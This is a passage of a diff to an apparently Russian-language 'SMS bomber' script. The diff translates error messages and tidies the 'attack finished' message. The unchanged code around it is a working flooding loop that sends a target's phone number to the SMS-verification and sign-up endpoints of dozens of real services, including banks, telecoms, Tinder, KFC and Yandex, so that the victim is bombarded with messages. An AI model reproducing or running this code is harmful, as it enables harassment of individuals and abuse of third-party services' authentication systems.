             print('[+] Sberbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -3925,10 +3925,10 @@ if call == str(2):
             print('[+] Psbank отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
@@ -3936,10 +3936,10 @@ if call == str(2):
             print('[+] Beltelcom отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
@@ -3947,10 +3947,10 @@ if call == str(2):
             print('[+] Karusel отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
@@ -3958,10 +3958,10 @@ if call == str(2):
             print('[+] KFC отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.chef.yandex/api/v2/auth/sms', json={"phone": _phone})
@@ -3969,10 +3969,10 @@ if call == str(2):
             print('[+] Yandex.Chef отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code',
@@ -3981,10 +3981,10 @@ if call == str(2):
             print('[+] MTS отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -3993,14 +3993,14 @@ if call == str(2):
             print('[+] Delitime отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -4009,10 +4009,10 @@ if call == str(2):
             print('[+] Guru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -4022,10 +4022,10 @@ if call == str(2):
             print('[+] ICQ отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -4035,10 +4035,10 @@ if call == str(2):
             print('[+] InDriver отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -4047,10 +4047,10 @@ if call == str(2):
             print('[+] Invitro отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
@@ -4058,10 +4058,10 @@ if call == str(2):
             print('[+] Pmsm отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
@@ -4069,10 +4069,10 @@ if call == str(2):
             print('[+] IVI отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode', json={'phone': '+' + _phone})
@@ -4080,10 +4080,10 @@ if call == str(2):
             print('[+] Lenta отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -4092,10 +4092,10 @@ if call == str(2):
             print('[+] Mail.ru отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -4105,10 +4105,10 @@ if call == str(2):
             print('[+] MVideo отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -4117,10 +4117,10 @@ if call == str(2):
             print('[+] OK отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
@@ -4128,10 +4128,10 @@ if call == str(2):
             print('[+] qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://sso.cloud.qlean.ru/http/users/requestotp',
@@ -4141,10 +4141,10 @@ if call == str(2):
             print('[+] Qlean отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
@@ -4152,10 +4152,10 @@ if call == str(2):
             print('[+] SMSgorod отправлено! || Кол-во - ' + str(R))
             time.sleep(1)
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -4163,25 +4163,25 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено! || Кол-во - ' + str(R))
         except:
-            print('[-] error in sent!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': _phone9}).json()["res"]
             R = R + 1
             print('[+] RuTaxi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -4189,55 +4189,55 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone}, headers={})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+' + _phone}, headers={})
             R = R + 1
             print('[+] Tinkoff отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': _phone}, headers={})
             R = R + 1
             print('[+] MTS отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': _phone})
             R = R + 1
             print('[+] Youla отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://pizzahut.ru/account/password-reset',
@@ -4246,22 +4246,22 @@ if call == str(2):
             R = R + 1
             print('[+] PizzaHut отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.rabota.ru/remind', data={'credential': _phone})
             R = R + 1
             print('[+] Rabota отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+' + _phone})
@@ -4273,7 +4273,7 @@ if call == str(2):
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php',
@@ -4281,11 +4281,11 @@ if call == str(2):
             R = R + 1
             print('[+] Smsint отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.get(
@@ -4293,11 +4293,11 @@ if call == str(2):
             R = R + 1
             print('[+] oyorooms отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post(
@@ -4308,11 +4308,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://newnext.ru/graphql', json={'operationName': 'registration', 'variables': {
@@ -4321,22 +4321,22 @@ if call == str(2):
             R = R + 1
             print('[+] newnext отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.sunlight.net/v3/customers/authorization/', data={'phone': _phone})
             R = R + 1
             print('[+] Sunlight отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://alpari.com/api/ru/protection/deliver/2f178b17990ca4b7903aa834b9f54c2c0bcb01a2/',
@@ -4345,22 +4345,22 @@ if call == str(2):
             R = R + 1
             print('[+] alpari отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lk.invitro.ru/lk2/lka/patient/refreshCode', data={'phone': _phone})
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://online.sbis.ru/reg/service/',
@@ -4369,11 +4369,11 @@ if call == str(2):
             R = R + 1
             print('[+] Sberbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ib.psbank.ru/api/authentication/extendedClientAuthRequest',
@@ -4385,44 +4385,44 @@ if call == str(2):
             R = R + 1
             print('[+] Psbank отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
             R = R + 1
             print('[+] Beltelcom отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone})
             R = R + 1
             print('[+] Karusel отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', json={'phone': '+' + _phone})
             R = R + 1
             print('[+] KFC отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.carsmile.com/",
@@ -4431,22 +4431,22 @@ if call == str(2):
             R = R + 1
             print('[+] carsmile отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.citilink.ru/registration/confirm/phone/+' + _phone + '/')
             R = R + 1
             print('[+] Citilink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.delitime.ru/api/v2/signup",
@@ -4454,11 +4454,11 @@ if call == str(2):
             R = R + 1
             print('[+] Delitime отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://guru.taxi/api/v1/driver/session/verify",
@@ -4466,11 +4466,11 @@ if call == str(2):
             R = R + 1
             print('[+] Guru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.icq.com/smsreg/requestPhoneValidation.php',
@@ -4479,11 +4479,11 @@ if call == str(2):
             R = R + 1
             print('[+] ICQ отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://terra-1.indriverapp.com/api/authorization?locale=ru",
@@ -4492,11 +4492,11 @@ if call == str(2):
             R = R + 1
             print('[+] InDriver отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://lk.invitro.ru/sp/mobileApi/createUserByPassword",
@@ -4504,33 +4504,33 @@ if call == str(2):
             R = R + 1
             print('[+] Invitro отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://ube.pmsm.org.ru/esb/iqos-phone/validate', json={"phone": _phone})
             R = R + 1
             print('[+] Pmsm отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6", data={"phone": _phone})
             R = R + 1
             print('[+] IVI отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',
@@ -4538,11 +4538,11 @@ if call == str(2):
             R = R + 1
             print('[+] Lenta отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cloud.mail.ru/api/v2/notify/applink',
@@ -4550,11 +4550,11 @@ if call == str(2):
             R = R + 1
             print('[+] Mail.ru отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',
@@ -4563,11 +4563,11 @@ if call == str(2):
             R = R + 1
             print('[+] MVideo отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://ok.ru/dk?cmd=AnonymRegistrationEnterPhone&st.cmd=anonymRegistrationEnterPhone",
@@ -4575,44 +4575,44 @@ if call == str(2):
             R = R + 1
             print('[+] OK отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://plink.tech/register/', json={"phone": _phone})
             R = R + 1
             print('[+] Plink отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("https://qlean.ru/clients-api/v2/sms_codes/auth/request_code", json={"phone": _phone})
             R = R + 1
             print('[+] qlean отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post("http://smsgorod.ru/sendsms.php", data={"number": _phone})
             R = R + 1
             print('[+] SMSgorod отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
@@ -4620,11 +4620,11 @@ if call == str(2):
             R = R + 1
             print('[+] Tinder отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://passport.twitch.tv/register?trusted_request=true',
@@ -4634,11 +4634,11 @@ if call == str(2):
             R = R + 1
             print('[+] Twitch отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
 
         if time.time() > start_time + float(CLOSE_AFTER):
             print(Fore.RED)
-            print("Атака закончена ! Нажмите на ENTER для закрытия программы......")
+            print("Атака закончена! Нажмите на ENTER для закрытия программы...")
             break
         try:
             requests.post('https://cabinet.wi-fi.ru/api/auth/by-sms', data={'msisdn': _phone},
@@ -4646,10 +4646,10 @@ if call == str(2):
             R = R + 1
             print('[+] CabWiFi отправлено!|| Кол-во - ' + str(R))
         except:
-            print('[-] Не отправлено!')
+            print('[-] Ошибка при отправке!')
